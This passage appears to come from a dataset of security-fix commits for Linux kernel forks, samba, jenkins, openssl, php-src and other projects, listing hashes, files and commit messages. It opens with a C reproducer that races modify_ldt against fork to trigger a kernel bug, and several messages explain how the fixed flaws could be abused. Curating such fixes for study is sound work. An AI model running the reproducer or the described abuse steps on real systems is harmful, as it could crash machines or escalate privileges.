<signal.h>     #include <stdlib.h>     #include <sys/syscall.h>     #include <sys/wait.h>     #include <unistd.h>\n\n    static void *fork_thread(void *_arg)     {         fork()      }\n\n    int main(void)     {         struct user_desc desc = { .entry_number = 8191 } \n\n        syscall(__NR_modify_ldt, 1, &desc, sizeof(desc)) \n\n        for (  ) {             if (fork() == 0) {                 pthread_t t \n\n                srand(getpid())                  pthread_create(&t, NULL, fork_thread, NULL)                  usleep(rand() % 10000)                  syscall(__NR_exit_group, 0)              }             wait(NULL)          }     }\n\nNote: the reproducer takes advantage of the fact that alloc_ldt_struct() may use vmalloc() to allocate a large ->entries array, and after commit:\n\n  5d17a73a2ebe ("vmalloc: back off when the current task is killed")\n\nit is possible for userspace to fail a task's vmalloc() by sending a fatal signal, e.g. via exit_group().  It would be more difficult to reproduce this bug on kernels without that commit.\n\nThis bug only affected kernels with CONFIG_MODIFY_LDT_SYSCALL=y.\n\nSigned-off-by: Eric Biggers <ebiggers@google.com> Acked-by: Dave Hansen <dave.hansen@linux.intel.com> Cc: <stable@vger.kernel.org> [v4.6+] Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Andy Lutomirski <luto@amacapital.net> Cc: Borislav Petkov <bp@alien8.de> Cc: Brian Gerst <brgerst@gmail.com> Cc: Christoph Hellwig <hch@lst.de> Cc: Denys Vlasenko <dvlasenk@redhat.com> Cc: Dmitry Vyukov <dvyukov@google.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Michal Hocko <mhocko@suse.com> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Rik van Riel <riel@redhat.com> Cc: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: linux-mm@kvack.org Fixes: 39a0526fb3f7 ("x86/mm: Factor out LDT init from context init") Link: http://lkml.kernel.org/r/20170824175029.76040-1-ebiggers3@gmail.com Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    a9c97eea6c268fb83d93a817d58bac75e0d2599e
File(s) In Commit: 
    custom/run.cgi
Blob(s) In Commit: 
    375b041b930642b6b74844ac9d59cba5b5f4ab23
Blob(s) Before Fix: 
    375b041b930642b6b74844ac9d59cba5b5f4ab23
Projects:
    Anialation81_webmin
Commit Message for a9c97eea6c268fb83d93a817d58bac75e0d2599e:
HTML escape command description

======================================================================
Commit With Fix: 
    1a6a6e462dc2ac6111f9e02c6852ddec4849b887
File(s) In Commit: 
    kdc/kerberos5.c
Blob(s) In Commit: 
    1582fee751b0442c578ee176db44da74edc26a66
Blob(s) Before Fix: 
    1582fee751b0442c578ee176db44da74edc26a66
Projects:
    17500mph_samba
Commit Message for 1a6a6e462dc2ac6111f9e02c6852ddec4849b887:
Security: Avoid NULL structure pointer member dereference\n\nThis can happen in the error path when processing malformed AS requests with a NULL client name.  Bug originally introduced on Fri Feb 13 09:26:01 2015 +0100 in commit:\n\n    a873e21d7c06f22943a90a41dc733ae76799390d\n\n    kdc: base _kdc_fast_mk_error() on krb5_mk_error_ext()\n\nOriginal patch by Jeffrey Altman <jaltman@secure-endpoints.com>

======================================================================
Commit With Fix: 
    8f659a03a0ba9289b9aeb9b4470e6fb263d6f483
File(s) In Commit: 
    net/ipv4/raw.c
Blob(s) In Commit: 
    125c1eab3eaa6d894804c3aa8918aa7fcc736ca0
Blob(s) Before Fix: 
    125c1eab3eaa6d894804c3aa8918aa7fcc736ca0
Projects:
    0-T-0_ps4-linux
Commit Message for 8f659a03a0ba9289b9aeb9b4470e6fb263d6f483:
net: ipv4: fix for a race condition in raw_sendmsg\n\ninet->hdrincl is racy, and could lead to uninitialized stack pointer usage, so its value should be read only once.\n\nFixes: c008ba5bdc9f ("ipv4: Avoid reading user iov twice after raw_probe_proto_opt") Signed-off-by: Mohamed Ghannam <simo.ghannam@gmail.com> Reviewed-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    7c6f74e43008b2397160775696c67acbab87911d
File(s) In Commit: 
    inc/conv.php
Blob(s) In Commit: 
    6f0f58ff84c813ac4547d0ee0b38b51a3d3c2404
Blob(s) Before Fix: 
    6f0f58ff84c813ac4547d0ee0b38b51a3d3c2404
Projects:
    Ikse_blogotext
Commit Message for 7c6f74e43008b2397160775696c67acbab87911d:
fix security issue with comment

======================================================================
Commit With Fix: 
    101dc1d37010a1d877d6961ed2f32d089c708e91
File(s) In Commit: 
    admin/maintenance.php
Blob(s) In Commit: 
    17fa55e640d3ae796481886aeb827e421cb46c4a
Blob(s) Before Fix: 
    17fa55e640d3ae796481886aeb827e421cb46c4a
Projects:
    Ikse_blogotext
Commit Message for 101dc1d37010a1d877d6961ed2f32d089c708e91:
fix windows server zip file name for backup

======================================================================
Commit With Fix: 
    256041d8cab2fdc50678f4d49d916fea25cdb4fd
File(s) In Commit: 
    admin/preferences.php
Blob(s) In Commit: 
    a1b5d6c6fd8d892e371ed02a2c4dccc4d3647de2
Blob(s) Before Fix: 
    a1b5d6c6fd8d892e371ed02a2c4dccc4d3647de2
Projects:
    Ikse_blogotext
Commit Message for 256041d8cab2fdc50678f4d49d916fea25cdb4fd:
fix form email security issue

======================================================================
Commit With Fix: 
    4dca6ea1d9432052afb06baf2e3ae78188a4410b
File(s) In Commit: 
    security/keys/request_key.c
Blob(s) In Commit: 
    114f7408feee620b868801cbb53b578e7b44f615
Blob(s) Before Fix: 
    114f7408feee620b868801cbb53b578e7b44f615
Projects:
    0-T-0_ps4-linux
Commit Message for 4dca6ea1d9432052afb06baf2e3ae78188a4410b:
KEYS: add missing permission check for request_key() destination\n\nWhen the request_key() syscall is not passed a destination keyring, it links the requested key (if constructed) into the "default" request-key keyring.  This should require Write permission to the keyring.  However, there is actually no permission check.\n\nThis can be abused to add keys to any keyring to which only Search permission is granted.  This is because Search permission allows joining the keyring.  keyctl_set_reqkey_keyring(KEY_REQKEY_DEFL_SESSION_KEYRING) then will set the default request-key keyring to the session keyring. Then, request_key() can be used to add keys to the keyring.\n\nBoth negatively and positively instantiated keys can be added using this method.  Adding negative keys is trivial.  Adding a positive key is a bit trickier.  It requires that either /sbin/request-key positively instantiates the key, or that another thread adds the key to the process keyring at just the right time, such that request_key() misses it initially but then finds it in construct_alloc_key().\n\nFix this bug by checking for Write permission to the keyring in construct_get_dest_keyring() when the default keyring is being used.\n\nWe don't do the permission check for non-default keyrings because that was already done by the earlier call to lookup_user_key().  Also, request_key_and_link() is currently passed a 'struct key *' rather than a key_ref_t, so the "possessed" bit is unavailable.\n\nWe also don't do the permission check for the "requestor keyring", to continue to support the use case described by commit 8bbf4976b59f ("KEYS: Alter use of key instantiation link-to-keyring argument") where /sbin/request-key recursively calls request_key() to add keys to the original requestor's destination keyring.  (I don't know of any users who actually do that, though...)\n\nFixes: 3e30148c3d52 ("[PATCH] Keys: Make request-key create an authorisation key") Cc: <stable@vger.kernel.org>	# v2.6.13+ Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: David Howells <dhowells@redhat.com>

======================================================================
Commit With Fix: 
    d76c68109f37cb85b243a1cf0f40313afd2bae68
File(s) In Commit: 
    crypto/pcrypt.c
Blob(s) In Commit: 
    f8ec3d4ba4a80f8eefed739d9e8a852865a7ac02
Blob(s) Before Fix: 
    f8ec3d4ba4a80f8eefed739d9e8a852865a7ac02
Projects:
    0-T-0_ps4-linux
Commit Message for d76c68109f37cb85b243a1cf0f40313afd2bae68:
crypto: pcrypt - fix freeing pcrypt instances\n\npcrypt is using the old way of freeing instances, where the ->free() method specified in the 'struct crypto_template' is passed a pointer to the 'struct crypto_instance'.  But the crypto_instance is being kfree()'d directly, which is incorrect because the memory was actually allocated as an aead_instance, which contains the crypto_instance at a nonzero offset.  Thus, the wrong pointer was being kfree()'d.\n\nFix it by switching to the new way to free aead_instance's where the ->free() method is specified in the aead_instance itself.\n\nReported-by: syzbot <syzkaller@googlegroups.com> Fixes: 0496f56065e0 ("crypto: pcrypt - Add support for new AEAD interface") Cc: <stable@vger.kernel.org> # v4.2+ Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

======================================================================
Commit With Fix: 
    340d394a789518018f834ff70f7534fc463d3226
File(s) In Commit: 
    drivers/input/serio/i8042.c
Blob(s) In Commit: 
    824f4c1c1f3103dab4596ffc287c438fbc0345b3
Blob(s) Before Fix: 
    824f4c1c1f3103dab4596ffc287c438fbc0345b3
Projects:
    0-T-0_ps4-linux
Commit Message for 340d394a789518018f834ff70f7534fc463d3226:
Input: i8042 - fix crash at boot time\n\nThe driver checks port->exists twice in i8042_interrupt(), first when trying to assign temporary "serio" variable, and second time when deciding whether it should call serio_interrupt(). The value of port->exists may change between the 2 checks, and we may end up calling serio_interrupt() with a NULL pointer:\n\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000050 IP: [<ffffffff8150feaf>] _spin_lock_irqsave+0x1f/0x40 PGD 0 Oops: 0002 [#1] SMP last sysfs file: CPU 0 Modules linked in:\n\nPid: 1, comm: swapper Not tainted 2.6.32-358.el6.x86_64 #1 QEMU Standard PC (i440FX + PIIX, 1996) RIP: 0010:[<ffffffff8150feaf>]  [<ffffffff8150feaf>] _spin_lock_irqsave+0x1f/0x40 RSP: 0018:ffff880028203cc0  EFLAGS: 00010082 RAX: 0000000000010000 RBX: 0000000000000000 RCX: 0000000000000000 RDX: 0000000000000282 RSI: 0000000000000098 RDI: 0000000000000050 RBP: ffff880028203cc0 R08: ffff88013e79c000 R09: ffff880028203ee0 R10: 0000000000000298 R11: 0000000000000282 R12: 0000000000000050 R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000098 FS:  0000000000000000(0000) GS:ffff880028200000(0000) knlGS:0000000000000000 CS:  0010 DS: 0018 ES: 0018 CR0: 000000008005003b CR2: 0000000000000050 CR3: 0000000001a85000 CR4: 00000000001407f0 DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400 Process swapper (pid: 1, threadinfo ffff88013e79c000, task ffff88013e79b500) Stack: ffff880028203d00 ffffffff813de186 ffffffffffffff02 0000000000000000 <d> 0000000000000000 0000000000000000 0000000000000000 0000000000000098 <d> ffff880028203d70 ffffffff813e0162 ffff880028203d20 ffffffff8103b8ac Call Trace: <IRQ>  [<ffffffff813de186>] serio_interrupt+0x36/0xa0 [<ffffffff813e0162>] i8042_interrupt+0x132/0x3a0 [<ffffffff8103b8ac>] ? kvm_clock_read+0x1c/0x20 [<ffffffff8103b8b9>] ? kvm_clock_get_cycles+0x9/0x10 [<ffffffff810e1640>] handle_IRQ_event+0x60/0x170 [<ffffffff8103b154>] ? kvm_guest_apic_eoi_write+0x44/0x50 [<ffffffff810e3d8e>] handle_edge_irq+0xde/0x180 [<ffffffff8100de89>] handle_irq+0x49/0xa0 [<ffffffff81516c8c>] do_IRQ+0x6c/0xf0 [<ffffffff8100b9d3>] ret_from_intr+0x0/0x11 [<ffffffff81076f63>] ? __do_softirq+0x73/0x1e0 [<ffffffff8109b75b>] ? hrtimer_interrupt+0x14b/0x260 [<ffffffff8100c1cc>] ? call_softirq+0x1c/0x30 [<ffffffff8100de05>] ? do_softirq+0x65/0xa0 [<ffffffff81076d95>] ? irq_exit+0x85/0x90 [<ffffffff81516d80>] ? smp_apic_timer_interrupt+0x70/0x9b [<ffffffff8100bb93>] ? apic_timer_interrupt+0x13/0x20\n\nTo avoid the issue let's change the second check to test whether serio is NULL or not.\n\nAlso, let's take i8042_lock in i8042_start() and i8042_stop() instead of trying to be overly smart and using memory barriers.\n\nSigned-off-by: Chen Hong <chenhong3@huawei.com> [dtor: take lock in i8042_start()/i8042_stop()] Cc: stable@vger.kernel.org Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>

======================================================================
Commit With Fix: 
    83c9f495ffe70c7dd280b41fdfd4881485a3bc28
File(s) In Commit: 
    library/ssl_srv.c
Blob(s) In Commit: 
    97d7a9e80be0282d786ea46ae7a4d777ea9440e9
Blob(s) Before Fix: 
    97d7a9e80be0282d786ea46ae7a4d777ea9440e9
Projects:
    007h_mbed
Commit Message for 83c9f495ffe70c7dd280b41fdfd4881485a3bc28:
Prevent bounds check bypass through overflow in PSK identity parsing\n\nThe check `if( *p + n > end )` in `ssl_parse_client_psk_identity` is unsafe because `*p + n` might overflow, thus bypassing the check. As `n` is a user-specified value up to 65K, this is relevant if the library happens to be located in the last 65K of virtual memory.\n\nThis commit replaces the check by a safe version.

======================================================================
Commit With Fix: 
    0cb5ba0f6e83162d221681f47b470c3042eef237
File(s) In Commit: 
    saml-core/src/main/java/org/keycloak/saml/common/util/StaxParserUtil.java
Blob(s) In Commit: 
    c446f6dfcdf06345032bab836d706b6f94b8f0e9
Blob(s) Before Fix: 
    c446f6dfcdf06345032bab836d706b6f94b8f0e9
Projects:
    01epa_keycloak
    0x6a77_swagger-codegen
Commit Message for 0cb5ba0f6e83162d221681f47b470c3042eef237:
KEYCLOAK-4160

======================================================================
Commit With Fix: 
    33ab91103b3415e12457e3104f0e4517ce12d0f3
File(s) In Commit: 
    arch/x86/kvm/emulate.c
Blob(s) In Commit: 
    cedbba0f3402d2343ce069fe3ed6a07f44f68907
Blob(s) Before Fix: 
    cedbba0f3402d2343ce069fe3ed6a07f44f68907
Projects:
    0-T-0_ps4-linux
Commit Message for 33ab91103b3415e12457e3104f0e4517ce12d0f3:
KVM: x86: fix emulation of "MOV SS, null selector"\n\nThis is CVE-2017-2583.  On Intel this causes a failed vmentry because SS's type is neither 3 nor 7 (even though the manual says this check is only done for usable SS, and the dmesg splat says that SS is unusable!). On AMD it's worse: svm.c is confused and sets CPL to 0 in the vmcb.\n\nThe fix fabricates a data segment descriptor when SS is set to a null selector, so that CPL and SS.DPL are set correctly in the VMCS/vmcb. Furthermore, only allow setting SS to a NULL selector if SS.RPL < 3  this in turn ensures CPL < 3 because RPL must be equal to CPL.\n\nThanks to Andy Lutomirski and Willy Tarreau for help in analyzing the bug and deciphering the manuals.\n\nReported-by: Xiaohan Zhang <zhangxiaohan1@huawei.com> Fixes: 79d5b4c3cd809c770d4bf9812635647016c56011 Cc: stable@nongnu.org Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    129a72a0d3c8e139a04512325384fe5ac119e74d
File(s) In Commit: 
    arch/x86/kvm/emulate.c
Blob(s) In Commit: 
    f36d0fa6b8854ef562ff84c4692e55fd43844533
Blob(s) Before Fix: 
    f36d0fa6b8854ef562ff84c4692e55fd43844533
Projects:
    0-T-0_ps4-linux
Commit Message for 129a72a0d3c8e139a04512325384fe5ac119e74d:
KVM: x86: Introduce segmented_write_std\n\nIntroduces segemented_write_std.\n\nSwitches from emulated reads/writes to standard read/writes in fxsave, fxrstor, sgdt, and sidt.  This fixes CVE-2017-2584, a longstanding kernel memory leak.\n\nSince commit 283c95d0e389 ("KVM: x86: emulate FXSAVE and FXRSTOR", 2016-11-09), which is luckily not yet in any final release, this would also be an exploitable kernel memory *write*!\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Cc: stable@vger.kernel.org Fixes: 96051572c819194c37a8367624b285be10297eca Fixes: 283c95d0e3891b64087706b344a4b545d04a6e62 Suggested-by: Paolo Bonzini <pbonzini@redhat.com> Signed-off-by: Steve Rutherford <srutherford@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    307ed31caba68a46426b8c73a787a05add2c7489
File(s) In Commit: 
    war/src/main/webapp/scripts/hudson-behavior.js
Blob(s) In Commit: 
    77a4c41b34e38a47919c51fb9a49a206f766bca7
Blob(s) Before Fix: 
    77a4c41b34e38a47919c51fb9a49a206f766bca7
Projects:
    01user_jenkins
Commit Message for 307ed31caba68a46426b8c73a787a05add2c7489:
Merge pull request #98 from jenkinsci-cert/SECURITY-388\n\n[SECURITY-388] Escape metacharacters in the search box

======================================================================
Commit With Fix: 
    97a61a9fe55f4c16168c123f98301a5173b9fa86
File(s) In Commit: 
    core/src/main/java/jenkins/model/Jenkins.java
Blob(s) In Commit: 
    5d4532700756a11b8688726588c6047c43d0c10a
Blob(s) Before Fix: 
    5d4532700756a11b8688726588c6047c43d0c10a
Projects:
    01user_jenkins
Commit Message for 97a61a9fe55f4c16168c123f98301a5173b9fa86:
Merge pull request #99 from jenkinsci-cert/SECURITY-389\n\n[SECURITY-389] Check ADMINISTER on /fingerprintCleanup and /workspaceCleanup

======================================================================
Commit With Fix: 
    dffab154d29a288aa171ff50263ecc8f2e14a891
File(s) In Commit: 
    login-utils/su-common.c
Blob(s) In Commit: 
    696adc8888ad901efbb98f7878c31e4a21c4cf27
Blob(s) Before Fix: 
    696adc8888ad901efbb98f7878c31e4a21c4cf27
Projects:
    0e318236-1680-41a8-a989-3c9227637cdf_util-linux
Commit Message for dffab154d29a288aa171ff50263ecc8f2e14a891:
su: properly clear child PID\n\nReported-by: Tobias Stöckmann <tobias@stoeckmann.org> Signed-off-by: Karel Zak <kzak@redhat.com>

======================================================================
Commit With Fix: 
    000030feb7a30f193197f1aab8a7b04a26b42735
File(s) In Commit: 
    src/auth/db-dict.c
Blob(s) In Commit: 
    a4c3b53ce7b572727818b44d2241826201b0fd3e
Blob(s) Before Fix: 
    a4c3b53ce7b572727818b44d2241826201b0fd3e
Projects:
    001101_server
Commit Message for 000030feb7a30f193197f1aab8a7b04a26b42735:
auth: Do not double-expand key in passdb dict when authenticating\n\nBroken by 79042f8c

======================================================================
Commit With Fix: 
    43a6684519ab0a6c52024b5e25322476cabad893
File(s) In Commit: 
    net/ipv4/ping.c
Blob(s) In Commit: 
    ccfbce13a6333a65dab64e4847dd510dfafb1b43
Blob(s) Before Fix: 
    ccfbce13a6333a65dab64e4847dd510dfafb1b43
Projects:
    0-T-0_ps4-linux
Commit Message for 43a6684519ab0a6c52024b5e25322476cabad893:
ping: implement proper locking\n\nWe got a report of yet another bug in ping\n\nhttp://www.openwall.com/lists/oss-security/2017/03/24/6\n\n->disconnect() is not called with socket lock held.\n\nFix this by acquiring ping rwlock earlier.\n\nThanks to Daniel, Alexander and Andrey for letting us know this problem.\n\nFixes: c319b4d76b9e ("net: ipv4: add IPPROTO_ICMP socket kind") Signed-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Daniel Jiang <danieljiang0415@gmail.com> Reported-by: Solar Designer <solar@openwall.com> Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    a70934eea95c76a7737b83773bffe8738935082d
File(s) In Commit: 
    lib/ofx_preproc.cpp
Blob(s) In Commit: 
    f07f2749232bc51da938b972ca09449d6dc1d941
Blob(s) Before Fix: 
    f07f2749232bc51da938b972ca09449d6dc1d941
Projects:
    daissi_libofx
Commit Message for a70934eea95c76a7737b83773bffe8738935082d:
Fix a buffer overflow.\n\nThis is only the minimum workaround to prevent buffer overflow: Stop iterating once the (fixed!) size of the output buffers is reached. In response to https://www.talosintelligence.com/vulnerability_reports/TALOS-2017-0317\n\nHowever, this code is a huge mess anyway and is in no way anything like up-to-date C++ code. Please, anyone, replace it with something more modern. Thanks.

======================================================================
Commit With Fix: 
    898fb884b706aaeb283de4812340bb0bde8476dc
File(s) In Commit: 
    ssl/ssl.h
Blob(s) In Commit: 
    3cf96a239bab448cb58d838f1d699604ec5010a3
Blob(s) Before Fix: 
    3cf96a239bab448cb58d838f1d699604ec5010a3
Projects:
    0902710055_openssl
Commit Message for 898fb884b706aaeb283de4812340bb0bde8476dc:
Don't allow read/write after fatal error\n\nOpenSSL 1.0.2 (starting from version 1.0.2b) introduced an "error state" mechanism. The intent was that if a fatal error occurred during a handshake then OpenSSL would move into the error state and would immediately fail if you attempted to continue the handshake. This works as designed for the explicit handshake functions (SSL_do_handshake(), SSL_accept() and SSL_connect()), however due to a bug it does not work correctly if SSL_read() or SSL_write() is called directly. In that scenario, if the handshake fails then a fatal error will be returned in the initial function call. If SSL_read()/SSL_write() is subsequently called by the application for the same SSL object then it will succeed and the data is passed without being decrypted/encrypted directly from the SSL/TLS record layer.\n\nIn order to exploit this issue an attacker would have to trick an application into behaving incorrectly by issuing an SSL_read()/SSL_write() after having already received a fatal error.\n\nThanks to David Benjamin (Google) for reporting this issue and suggesting this fix.\n\nCVE-2017-3737\n\nReviewed-by: Rich Salz <rsalz@openssl.org>

======================================================================
Commit With Fix: 
    ba27c91351878bc297ec4baba0bd488a2f3b568d
File(s) In Commit: 
    src/backend/BSHTTP.pm
Blob(s) In Commit: 
    928b88a992284afa3f6ea1cfdeae0605ea8943c4
Blob(s) Before Fix: 
    928b88a992284afa3f6ea1cfdeae0605ea8943c4
Projects:
    Abdelhamidhenni_open-build-service
Commit Message for ba27c91351878bc297ec4baba0bd488a2f3b568d:
[backend] only allow plain files in cpio_sender\n\nNo devices, sockets, directories, symlinks please...

======================================================================
Commit With Fix: 
    3a55ddd3c4c11ce75a86afbefd085d8d397ff957
File(s) In Commit: 
    src/base64.c
Blob(s) In Commit: 
    ba8accab7a271f7ca87c75fb192d107000572b4a
Blob(s) Before Fix: 
    ba8accab7a271f7ca87c75fb192d107000572b4a
Projects:
    0neday_libimobiledevice
Commit Message for 3a55ddd3c4c11ce75a86afbefd085d8d397ff957:
base64: Rework base64decode to handle split encoded data correctly

======================================================================
Commit With Fix: 
    d7fc532c42f0e9bf427923bab85433282b3e5117
File(s) In Commit: 
    bubblewrap.c
Blob(s) In Commit: 
    4b5b8e659b3efa3327283c8b45a9edabc187dc16
Blob(s) Before Fix: 
    4b5b8e659b3efa3327283c8b45a9edabc187dc16
Projects:
    4144_bubblewrap
Commit Message for d7fc532c42f0e9bf427923bab85433282b3e5117:
Call setsid() before executing sandboxed code (CVE-2017-5226)\n\nThis prevents the sandboxed code from getting a controlling tty, which in turn prevents it from accessing the TIOCSTI ioctl and hence faking terminal input.\n\nFixes: #142\n\nCloses: #143 Approved by: cgwalters

======================================================================
Commit With Fix: 
    4cc0286f2f3780abc6084bcdae5dce595daa3c12
File(s) In Commit: 
    Zend/zend_hash.c
Blob(s) In Commit: 
    8b54a3932d0ab49ce19531e5083c9c019b14aaed
Blob(s) Before Fix: 
    8b54a3932d0ab49ce19531e5083c9c019b14aaed
Projects:
    0014593_php-src
Commit Message for 4cc0286f2f3780abc6084bcdae5dce595daa3c12:
Fix #73832 - leave the table in a safe state if the size is too big.

======================================================================
Commit With Fix: 
    26841d9c81f27ad23b2f6e4bd5eaec7f2f58dfe0
File(s) In Commit: 
    inc/files/files.ctrl.php
Blob(s) In Commit: 
    e7ecda94e89aac44848238047a5cecbeb74c8aaa
Blob(s) Before Fix: 
    e7ecda94e89aac44848238047a5cecbeb74c8aaa
Projects:
    Acidburn0zzz_b2evolution
Commit Message for 26841d9c81f27ad23b2f6e4bd5eaec7f2f58dfe0:
Fixed fm_selected parameter exploit

======================================================================
Commit With Fix: 
    9a069e0f2e027ec5138f998023cf9cb62c04889f
File(s) In Commit: 
    MagickCore/profile.c
Blob(s) In Commit: 
    66e742fc9b7bfaef2d1c0c4a41f4d4800bf6afe8
Blob(s) Before Fix: 
    66e742fc9b7bfaef2d1c0c4a41f4d4800bf6afe8
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 9a069e0f2e027ec5138f998023cf9cb62c04889f:
https://github.com/ImageMagick/ImageMagick/issues/354

======================================================================
Commit With Fix: 
    7391a506352c009fe044dead7baad9e22dd279ee
File(s) In Commit: 
    tools/plistutil.c
Blob(s) In Commit: 
    e943e766b05bd7c687d4ae5ec045f287050e361c
Blob(s) Before Fix: 
    e943e766b05bd7c687d4ae5ec045f287050e361c
Projects:
    0neday_libimobiledevice
Commit Message for 7391a506352c009fe044dead7baad9e22dd279ee:
plistutil: Prevent OOB heap buffer read by checking input size\n\nAs pointed out in #87 plistutil would do a memcmp with a heap buffer without checking the size. If the size is less than 8 it would read beyond the bounds of this heap buffer. This commit prevents that.

======================================================================
Commit With Fix: 
    c4e490cf148e85ead0d1b1c2caaba833f1d5b29f
File(s) In Commit: 
    mm/slab.c
Blob(s) In Commit: 
    4f2ec6bb46ebe949d2e19ff154faddc7e2526f02
Blob(s) Before Fix: 
    4f2ec6bb46ebe949d2e19ff154faddc7e2526f02
Projects:
    0-T-0_ps4-linux
Commit Message for c4e490cf148e85ead0d1b1c2caaba833f1d5b29f:
mm/slab.c: fix SLAB freelist randomization duplicate entries\n\nThis patch fixes a bug in the freelist randomization code.  When a high random number is used, the freelist will contain duplicate entries.  It will result in different allocations sharing the same chunk.\n\nIt will result in odd behaviours and crashes.  It should be uncommon but it depends on the machines.  We saw it happening more often on some machines (every few hours of running tests).\n\nFixes: c7ce4f60ac19 ("mm: SLAB freelist randomization") Link: http://lkml.kernel.org/r/20170103181908.143178-1-thgarnie@google.com Signed-off-by: John Sperbeck <jsperbeck@google.com> Signed-off-by: Thomas Garnier <thgarnie@google.com> Cc: Christoph Lameter <cl@linux.com> Cc: Pekka Enberg <penberg@kernel.org> Cc: David Rientjes <rientjes@google.com> Cc: Joonsoo Kim <iamjoonsoo.kim@lge.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    6d104af38b570d37aa32a5803b04c354f8ed513d
File(s) In Commit: 
    drivers/hid/hid-corsair.c
Blob(s) In Commit: 
    5971907a23b13db1250264f8a26c214e3c9b748a
Blob(s) Before Fix: 
    5971907a23b13db1250264f8a26c214e3c9b748a
Projects:
    0-T-0_ps4-linux
Commit Message for 6d104af38b570d37aa32a5803b04c354f8ed513d:
HID: corsair: fix DMA buffers on stack\n\nNot all platforms support DMA to the stack, and specifically since v4.9 this is no longer supported on x86 with VMAP_STACK either.\n\nNote that the macro-mode buffer was larger than necessary.\n\nFixes: 6f78193ee9ea ("HID: corsair: Add Corsair Vengeance K90 driver") Cc: stable <stable@vger.kernel.org> Signed-off-by: Johan Hovold <johan@kernel.org> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    05a974efa4bdf6e2a150e3f27dc6fcf0a9ad5655
File(s) In Commit: 
    drivers/net/ieee802154/atusb.c
Blob(s) In Commit: 
    fa3e8c34b26c95a4f57e1c419003a744fe43e4c0
Blob(s) Before Fix: 
    fa3e8c34b26c95a4f57e1c419003a744fe43e4c0
Projects:
    0-T-0_ps4-linux
Commit Message for 05a974efa4bdf6e2a150e3f27dc6fcf0a9ad5655:
ieee802154: atusb: do not use the stack for buffers to make them DMA able\n\nFrom 4.9 we should really avoid using the stack here as this will not be DMA able on various platforms. This changes the buffers already being present in time of 4.9 being released. This should go into stable as well.\n\nReported-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@vger.kernel.org Signed-off-by: Stefan Schmidt <stefan@osg.samsung.com> Signed-off-by: Marcel Holtmann <marcel@holtmann.org>

======================================================================
Commit With Fix: 
    146cc8a17a3b4996f6805ee5c080e7101277c410
File(s) In Commit: 
    drivers/usb/serial/kl5kusb105.c
Blob(s) In Commit: 
    6cb45757818fae2222383358b4d38d7c87b2dbf4
Blob(s) Before Fix: 
    6cb45757818fae2222383358b4d38d7c87b2dbf4
Projects:
    0-T-0_ps4-linux
Commit Message for 146cc8a17a3b4996f6805ee5c080e7101277c410:
USB: serial: kl5kusb105: fix line-state error handling\n\nThe current implementation failed to detect short transfers when attempting to read the line state, and also, to make things worse, logged the content of the uninitialised heap transfer buffer.\n\nFixes: abf492e7b3ae ("USB: kl5kusb105: fix DMA buffers on stack") Fixes: 1da177e4c3f4 ("Linux-2.6.12-rc2") Cc: stable <stable@vger.kernel.org> Reviewed-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org> Signed-off-by: Johan Hovold <johan@kernel.org>

======================================================================
Commit With Fix: 
    b9dc6f65bc5e232d1c05fe34b5daadc7e8bbf1fb
File(s) In Commit: 
    lib/iov_iter.c
Blob(s) In Commit: 
    e68604ae3cedf41ce98bc06de2142629fa115cbd
Blob(s) Before Fix: 
    e68604ae3cedf41ce98bc06de2142629fa115cbd
Projects:
    0-T-0_ps4-linux
Commit Message for b9dc6f65bc5e232d1c05fe34b5daadc7e8bbf1fb:
fix a fencepost error in pipe_advance()\n\nThe logics in pipe_advance() used to release all buffers past the new position failed in cases when the number of buffers to release was equal to pipe->buffers.  If that happened, none of them had been released, leaving pipe full.  Worse, it was trivial to trigger and we end up with pipe full of uninitialized pages.  IOW, it's an infoleak.\n\nCc: stable@vger.kernel.org # v4.9 Reported-by: "Alan J. Wylie" <alan@wylie.me.uk> Tested-by: "Alan J. Wylie" <alan@wylie.me.uk> Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

======================================================================
Commit With Fix: 
    497de07d89c1410d76a15bec2bb41f24a2a89f31
File(s) In Commit: 
    fs/posix_acl.c
Blob(s) In Commit: 
    c9d48dc784953fa4af62f9af58dfbb56ed2faa70
Blob(s) Before Fix: 
    c9d48dc784953fa4af62f9af58dfbb56ed2faa70
Projects:
    0-T-0_ps4-linux
Commit Message for 497de07d89c1410d76a15bec2bb41f24a2a89f31:
